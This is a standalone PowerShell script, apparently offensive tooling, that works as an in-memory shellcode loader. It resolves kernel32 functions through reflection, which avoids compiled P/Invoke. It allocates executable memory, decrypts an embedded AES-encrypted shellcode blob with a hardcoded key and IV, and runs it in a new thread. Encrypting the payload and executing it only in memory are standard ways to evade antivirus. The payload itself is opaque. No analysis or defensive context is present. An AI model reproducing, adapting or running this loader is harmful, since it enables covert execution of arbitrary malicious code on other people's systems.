function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)


$key = [System.Convert]::FromBase64String('TVvv8wmsmiflZcV4k20HyhPzZaiaZQSEmjUl3gbbBu4=');
$iv = [System.Convert]::FromBase64String('hj68pBdeQFneR/7nZx7h4Q==');
$encShellcode = [System.Convert]::FromBase64String('/nfHX3zrD3KcA31nVJLAWnpAqsZm/8wdD3vsPZwFlN2rW9pLjUHfP62og8F37AnxCo02KhVpd/Am1ruEiveS3SVmYTHuq283yJNmMUkSw7smGJOoFVytP/PSaScDLVfeAbHJOmry9TPibZvvS6x5KGdbmeYAz4KxkmX8dGSi01VaXmuv8Xny6TT5a+Mh53Rn/Lrh8OVcLr0sb3V4JST5bf8nDinGclV7JY2Lvuks90dQgVEw101zQ005YELxl5WP/YeOK0hkl52KeOFXlQhvjcIFZZxXPEb62OSrxce+Yo55fEiL2NwUp34bCwgKQtvBQEzMnvBAfnlRwaABKqLgTouX8p3AOVg2vz6ep1iOmyTPxgQKmqj/hJHrrA2yjXPvT2qC5JQJQYCge16FelZYF6kebgCDC4iqkT3yHW0Sus9BhzkqqDzYPJYmAsKULVyzVUHBiqCQofmtBj/uYJPn2Lecs4sLd1Gr9fh1dZfL/8EO5rLU7uxs5CCBs0Z3DfcYX097DYPKaK5Jr6cgYvV0JM+5UxKKYSSTvxBHhvsWQvmUK9ua1E9MYiLkEOG8hrOIEdXfyh6t3GwviSr45TYXWVf3XIAy3/4RVYQOrGeSRQTL3Z6tDvbxl1d6863fDAVLWSkWyqN0hJL5moihEqrNXeGNdqCWM0CJ7WaRE3j+jnQ=');


# Decrypt the shellcode
$AES = New-Object System.Security.Cryptography.AesManaged
$AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
$AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$AES.Key = $key
$AES.IV = $iv
$decryptor = $AES.CreateDecryptor()
$decodedShellcode = $decryptor.TransformFinalBlock($encShellcode, 0, $encShellcode.Length)


[System.Runtime.InteropServices.Marshal]::Copy($decodedShellcode, 0, $lpMem, $decodedShellcode.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
